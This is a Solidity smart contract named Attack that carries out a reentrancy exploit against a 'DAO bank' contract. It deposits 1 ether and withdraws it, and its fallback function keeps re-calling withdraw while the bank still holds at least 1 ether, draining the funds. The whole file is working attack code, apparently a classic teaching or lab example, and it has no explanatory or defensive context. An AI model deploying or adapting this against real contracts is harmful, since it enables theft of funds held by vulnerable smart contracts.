//SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

interface IDAOBank{
    function deposit() external payable;
    function withdraw() external;
}

contract Attack{

    IDAOBank public doaBank;

    constructor(address _daoBankAddress){
        doaBank = IDAOBank(_daoBankAddress);
    }

    fallback() external payable{
        if(address(doaBank).balance>=1 ether){
            doaBank.withdraw();
        }
    }

    function depositMoney() public payable{
        require(msg.value>= 1 ether);
        doaBank.deposit{value: 1 ether}();
        doaBank.withdraw();
    }

}